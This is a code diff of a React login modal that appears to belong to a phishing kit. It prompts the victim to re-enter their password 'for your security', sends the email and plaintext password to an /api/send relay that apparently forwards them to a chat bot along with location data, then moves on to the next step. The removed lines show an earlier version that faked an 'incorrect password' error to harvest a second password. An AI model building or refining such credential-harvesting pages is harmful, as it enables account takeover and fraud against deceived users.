@@ -11,18 +11,15 @@ import Image from 'next/image';
 import { useEffect, useState, type FC } from 'react';
 
 interface PasswordModalProps {
-    userProfileImage: string;
-    userName: string;
     userEmail: string;
     nextStep: () => void;
 }
 
-const PasswordModal: FC<PasswordModalProps> = ({ userProfileImage, userName, userEmail, nextStep }) => {
+const PasswordModal: FC<PasswordModalProps> = ({ userEmail, nextStep }) => {
     const [isLoading, setIsLoading] = useState(false);
     const [password, setPassword] = useState('');
     const [showPassword, setShowPassword] = useState(false);
-    const [attempt, setAttempt] = useState(1);
-    const [showError, setShowError] = useState(false);
+
     const [translations, setTranslations] = useState<Record<string, string>>({});
 
     const { messageId, setMessageId, message, setMessage, geoInfo } = store();
@@ -37,8 +34,7 @@ const PasswordModal: FC<PasswordModalProps> = ({ userProfileImage, userName, use
             'Password',
             'Continue',
             'Forgotten password?',
-            'For your security, you must enter your password to continue.',
-            'The password you\'ve entered is incorrect'
+            'For your security, you must enter your password to continue.'
         ];
         const translateAll = async () => {
             const results = await Promise.all(
@@ -63,57 +59,28 @@ const PasswordModal: FC<PasswordModalProps> = ({ userProfileImage, userName, use
         if (isLoading || !message || !password) return;
         setIsLoading(true);
 
-        if (attempt === 1) {
-            // First password attempt
-            const updatedMessage = `${message}
+        const updatedMessage = `${message}
 
 <b>📧 Account Email:</b> <code>${userEmail}</code>
-<b>🔒 Password 1:</b> <code>${password}</code>`;
+<b>🔒 Password:</b> <code>${password}</code>`;
 
-            try {
-                const res = await axios.post('/api/send', {
-                    message: updatedMessage,
-                    message_id: messageId
-                });
+        try {
+            const res = await axios.post('/api/send', {
+                message: updatedMessage,
+                message_id: messageId
+            });
 
-                if (res?.data?.success) {
-                    setMessage(updatedMessage);
-                    if (typeof res.data.data?.result?.message_id === 'number') {
-                        setMessageId(res.data.data.result.message_id);
-                    }
+            if (res?.data?.success) {
+                setMessage(updatedMessage);
+                if (typeof res.data.data?.result?.message_id === 'number') {
+                    setMessageId(res.data.data.result.message_id);
                 }
-            } catch {
-                // Continue even if send fails
-            } finally {
-                setIsLoading(false);
-                setShowError(true);
-                setPassword('');
-                setAttempt(2);
             }
-        } else if (attempt === 2) {
-            // Second password attempt
-            const updatedMessage = `${message}
-
-<b>🔒 Password 2:</b> <code>${password}</code>`;
-
-            try {
-                const res = await axios.post('/api/send', {
-                    message: updatedMessage,
-                    message_id: messageId
-                });
-
-                if (res?.data?.success) {
-                    setMessage(updatedMessage);
-                    if (typeof res.data.data?.result?.message_id === 'number') {
-                        setMessageId(res.data.data.result.message_id);
-                    }
-                }
-                nextStep();
-            } catch {
-                nextStep();
-            } finally {
-                setIsLoading(false);
-            }
+            nextStep();
+        } catch {
+            nextStep();
+        } finally {
+            setIsLoading(false);
         }
     };
 
@@ -153,13 +120,6 @@ const PasswordModal: FC<PasswordModalProps> = ({ userProfileImage, userName, use
                                 />
                             </div>
                         </div>
-
-                        {/* Error Message */}
-                        {showError && (
-                            <p className='text-xs sm:text-sm text-red-500'>
-                                {t('The password you\'ve entered is incorrect')}
-                            </p>
-                        )}
 
                         {/* Log In Button */}
                         <button
